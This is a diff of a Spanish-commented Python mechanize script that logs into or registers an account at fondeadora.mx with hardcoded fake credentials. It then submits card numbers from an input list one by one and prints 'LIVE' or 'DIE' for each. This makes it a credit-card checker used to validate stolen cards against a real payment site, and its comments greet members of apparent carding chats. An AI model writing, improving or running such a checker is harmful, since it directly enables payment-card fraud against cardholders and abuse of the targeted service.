@@ -34,6 +34,16 @@ br.form['user[password]'] = 'joshua75'
 
 br.submit()
 
+if (br.geturl() == "https://fondeadora.mx/login.html"):
+	response = br.open('https://fondeadora.mx/registrate.html')
+	br.select_form(nr=2)
+
+	br.form['user[name]'] = 'Zack Dasti'
+	br.form['user[email]'] = 'zackdasti@mail.com'
+	br.set_value('joshua75', nr=5)
+	br.set_value('joshua75', nr=6)
+	br.submit()
+
 contador = 0
 
 lista = sys.argv[1]
@@ -60,18 +70,19 @@ try:
 		br.submit()
 
 		if (urlpass != urlchecker):
-			print "	LIVE  " + cc + "\n"
+			print "  LIVE  " + cc + "\n"
 
 		else :
-			print "	DIE  " + cc + "\n"
+			print "  DIE  " + cc + "\n"
 
 		contador = contador + 1
 
 except:
-	print "	El Checker Ha Terminado :) "
+
+	print "  El Checker Ha Terminado :) "
 
 exit()
 
 #Saludos a todo el chat de administracion de chats de lhg 
 #Saludos a el chat # 1 y el chat #5 de lhg
-# Y por ultimo saludos a mi bb Andrew Gonzales :3 <3
+# Y por ultimo saludos a mi bb Andrew Gonzales :3 <3cd
